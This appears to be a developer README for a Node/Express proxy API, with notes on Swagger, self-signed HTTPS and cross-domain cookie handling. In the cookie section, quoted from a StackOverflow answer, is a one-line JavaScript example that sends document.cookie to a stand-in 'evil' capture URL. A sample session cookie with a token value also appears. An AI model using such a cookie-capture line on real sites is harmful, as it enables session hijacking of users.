# border-bpx1-api

## Document API

- API docs included Routing Execution
  - Docs API: <https://border-bpx1-api.herokuapp.com/api-docs>
  - Testing page : <https://border-bpx1-api.herokuapp.com>

## Setup

```js
npm install
npm start
```

## Todo

- Sync Domains Button
  - Sync all domain of all WLs
  - Save to local storage
    - Item localstorage is WL name
      - Ex: 'HABANA' : 'sda2fed32311154252'
  - Encrypt domain json by public key from backend & decrypt private key from front-end

## Bugs

- Input data number or string, ex 169 and '169'
- ***cannot unmarshal string into Go struct field*** => backend is implemented by golang
- Session expired error a(4)(wait session refresh)

## Notes

- body parameters swagger io 2.0 depcrecated

  ```js

  {"cookie":"borderproxy-deviceId=QZGVvSjXLm6SNU6N2PKS3Q==; Path=/; Expires=Tue, 12 Nov 2120 10:34:12 GMT; HttpOnly,borderproxy-token=Gsaf7dGgs7kSXWVpVJOl5l7SyjuYhio_c9Q8x0PFq5A=; Path=/; Expires=Thu, 19 Nov 2020 10:34:12 GMT; HttpOnly"}
  
  ```

- Open API 2.0 doesn't support set-cookie at response header (SWAGGER UI) : <https://github.com/scottie1984/swagger-ui-express/issues/80>

- Change docs api to OAS(Open API Swagger) 3.0.3 <https://swagger.io/docs/specification/describing-request-body/>

- <https://docs.sencha.com/extjs/6.2.1/modern/Ext.Date.html>

## Install Https in Express

- <https://hackernoon.com/set-up-ssl-in-nodejs-and-express-using-openssl-f2529eab5bb>
- Download OpenSSL Lib, extract and goto bin/openssl
  
  ```bash
  > openssl req -x509 -newkey rsa:2048 -keyout keytmp.pem -out cert.pem -days 365

  > openssl rsa -in keytmp.pem -out key.pem
  ```

  - Two statements will write down two files : ```key.pem``` and ```cert.pem```
  - Inject to express web server
  
  ```js
    const express = require('express')
    const app = express()
    const https = require('https')
    const fs = require('fs')
    const port = 3000

    app.get('/', (req, res) => {
      res.send('WORKING!')
    })

    const httpsOptions = {
      key: fs.readFileSync('./key.pem'),
      cert: fs.readFileSync('./cert.pem')
    }
    const server = https.createServer(httpsOptions, app).listen(port, () => {
      console.log('server running at ' + port)
  })
  ```

  - Chrome :
    - chrome://flags/#allow-insecure-localhost
    - type : allow invail -> enable it

- Run nodejs app at cpanel <http://prntscr.com/vr2tc5>

## Set Cookie to broswer from 3rd party scrips

- Ref: <https://javascript.info/cookie>
- Only work with https

  ```txt

    If we load a script from a third-party domain, like <script src="https://google-analytics.com/analytics.js">, and that script uses document.cookie to set a cookie, then such cookie is not third-party.

    If a script sets a cookie, then no matter where the script came from – the cookie belongs to the domain of the current webpage.
  ```

- <https://stackoverflow.com/questions/20170040/can-a-third-party-script-set-a-first-party-cookie>

  - Domain ```b.com``` load a script from domain ```a.com```
  - I read on MDN Note: ***The domain must match the domain of the JavaScript origin. Setting cookies to foreign domains will be silently ignored.*** Doesn't this contradict what you said? developer.mozilla.org/en-US/docs/Web/API/Document/cookie
  - A script from ```a.com``` can steal cookie of domain ```b.com``` by create a following tag and the cookie will be captured by server code of ```a.com``` domain

    ```html
    document.writeln("<img src='http://www.a.com/evil/data/capturer?" + document.cookie + "'>");
    ```

  - ==> Finally we only read cookie from thrid party script by ```document.cookie``` and can not set cookie by ```document.cookie = 'abc=ABC```
  - ==> How do i set cookie for b.com domain ? 
    - Create a iframe with ```src=b.com/?border-px1-cookie=response cookie json```
    - Add handling set cookie at window onload event of home page

## Send Cookies Cross Domain

- <https://stackoverflow.com/questions/60762810/cross-domain-ajax-request-with-jquery-not-sending-cookies>
- Add Samesite
- chrome://flags/#cookies-without-same-site-must-be-secure


----
To do

All user web client share cookie
- cookie check availabele => only 1 refresh apply, refresh request later use latest available cookie
